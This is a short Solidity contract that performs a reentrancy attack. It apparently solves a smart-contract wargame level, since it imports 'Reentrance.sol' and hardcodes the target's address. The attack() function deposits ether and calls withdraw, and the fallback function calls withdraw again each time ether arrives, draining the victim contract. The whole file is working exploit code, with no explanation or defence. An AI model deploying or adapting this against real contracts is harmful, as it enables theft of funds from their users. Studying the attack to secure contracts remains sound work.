// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import './Reentrance.sol';

contract ReEntrancy {
    Reentrance r = Reentrance(payable(address(0x26FEA39eb7e574eD7E5d2201E5Ad78bAac85060c)));
    address payable victimContract = payable(address(0x26FEA39eb7e574eD7E5d2201E5Ad78bAac85060c));
    //uint private victimBalance;
    constructor() public{
        //victimBalance = victimContract.balance; //1000000000000000
    }
    
    fallback() external payable{
        
        r.withdraw(msg.value);
        
    }

    function attack() external payable {
        r.donate.value(msg.value)(address(this));
        r.withdraw(msg.value);
    }   

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}